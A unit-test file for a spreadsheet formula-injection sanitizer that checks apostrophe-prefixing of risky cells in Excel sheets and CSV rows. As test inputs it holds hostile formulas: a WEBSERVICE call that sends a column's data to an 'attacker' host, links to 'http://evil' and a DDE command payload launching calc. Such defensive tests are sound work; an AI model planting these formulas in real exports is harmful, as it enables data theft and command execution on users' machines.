"""Unit tests for the Excel formula-injection sanitizer (issue #1081 finding G)."""

import datetime

import pytest

from openpyxl import Workbook

from app.utils.excel_safety import (
    is_formula_injection_risk,
    neutralise_worksheet,
    sanitize_csv_row,
    sanitize_excel_cell,
)


@pytest.mark.parametrize("lead", ["=", "+", "-", "@", "\t", "\r", "\n"])
def test_formula_trigger_prefixed_with_apostrophe(lead):
    payload = f'{lead}WEBSERVICE("https://attacker/x")'
    out = sanitize_excel_cell(payload)
    assert out == "'" + payload
    # The apostrophe makes the cell literal text — the value no longer leads
    # with a formula trigger.
    assert out[0] == "'"


def test_real_exfiltration_payload_is_neutralized():
    payload = '=WEBSERVICE("https://attacker/x?d="&TEXTJOIN(",",TRUE,N:N))'
    assert sanitize_excel_cell(payload) == "'" + payload


def test_plain_string_unchanged():
    assert sanitize_excel_cell("王小明") == "王小明"
    assert sanitize_excel_cell("310460031") == "310460031"
    # A dash INSIDE the string (not leading) is fine.
    assert sanitize_excel_cell("A-123") == "A-123"


def test_empty_string_unchanged():
    assert sanitize_excel_cell("") == ""


def test_non_string_values_pass_through_untouched():
    # Numbers/bools/dates/None must keep their native type so cell formatting
    # (thousands separators, date formats) still works.
    assert sanitize_excel_cell(1234) == 1234
    assert sanitize_excel_cell(12.5) == 12.5
    assert sanitize_excel_cell(True) is True
    assert sanitize_excel_cell(None) is None
    d = datetime.date(2026, 7, 6)
    assert sanitize_excel_cell(d) is d


def test_negative_number_as_string_is_prefixed_but_as_number_is_not():
    # A negative number written as a numeric type is safe (stays numeric);
    # the same value arriving as a user-typed STRING leads with '-' and is
    # neutralized.
    assert sanitize_excel_cell(-5) == -5
    assert sanitize_excel_cell("-5") == "'-5"


# ---------------------------------------------------------------------------
# CSV rows (issue #1223 A) — a CSV field has no cell type, so the apostrophe is
# the only portable text marker Excel/LibreOffice honour on import.
# ---------------------------------------------------------------------------


def test_sanitize_csv_row_neutralizes_values_only():
    row = {"name": '=HYPERLINK("http://evil","click")', "count": 3, "note": "ok"}
    out = sanitize_csv_row(row)
    assert out["name"] == "'" + row["name"]
    assert out["count"] == 3
    assert out["note"] == "ok"
    # Keys are never rewritten — DictWriter matches them against fieldnames.
    assert set(out) == set(row)


def test_sanitize_csv_row_does_not_mutate_the_caller_dict():
    row = {"name": "=1+1"}
    sanitize_csv_row(row)
    assert row["name"] == "=1+1"


# ---------------------------------------------------------------------------
# Worksheet sweep (issue #1223 A) — for sheets written by DataFrame.to_excel,
# which assigns through openpyxl without passing through our writers.
# ---------------------------------------------------------------------------


def test_neutralise_worksheet_rewrites_only_risky_cells():
    wb = Workbook()
    ws = wb.active
    ws.append(['=WEBSERVICE("http://evil")', "王小明", 114])
    ws.append(["+886912345678", None, 12.5])

    count = neutralise_worksheet(ws)

    assert count == 2
    assert ws.cell(row=1, column=1).value == '\'=WEBSERVICE("http://evil")'
    assert ws.cell(row=1, column=2).value == "王小明"
    assert ws.cell(row=1, column=3).value == 114
    assert ws.cell(row=2, column=1).value == "'+886912345678"
    assert ws.cell(row=2, column=2).value is None
    assert ws.cell(row=2, column=3).value == 12.5


def test_neutralise_worksheet_is_idempotent():
    """A second sweep must not stack apostrophes."""
    wb = Workbook()
    ws = wb.active
    ws.append(["=1+1"])

    assert neutralise_worksheet(ws) == 1
    assert neutralise_worksheet(ws) == 0
    assert ws.cell(row=1, column=1).value == "'=1+1"


def test_neutralise_worksheet_min_row_leaves_the_header_byte_identical():
    """Round-tripped templates match columns by exact header string, so a
    prefixed header would silently drop the whole column on re-upload."""
    wb = Workbook()
    ws = wb.active
    ws.append(["+886聯絡電話", "姓名"])  # admin-authored field labels
    ws.append(["=cmd|'/c calc'!A1", "王小明"])  # sample/data row

    count = neutralise_worksheet(ws, min_row=2)

    assert count == 1
    assert ws.cell(row=1, column=1).value == "+886聯絡電話"  # untouched
    assert ws.cell(row=2, column=1).value == "'=cmd|'/c calc'!A1"  # neutralised


def test_neutralise_worksheet_clean_sheet_returns_zero():
    wb = Workbook()
    ws = wb.active
    ws.append(["學號", "姓名", 114])
    assert neutralise_worksheet(ws) == 0


@pytest.mark.parametrize("lead", ["=", "+", "-", "@", "\t", "\r", "\n"])
def test_is_formula_injection_risk_matches_every_trigger(lead):
    assert is_formula_injection_risk(f"{lead}x") is True


def test_is_formula_injection_risk_false_for_safe_and_non_string():
    assert is_formula_injection_risk("王小明") is False
    assert is_formula_injection_risk("") is False
    assert is_formula_injection_risk(None) is False
    assert is_formula_injection_risk(114) is False
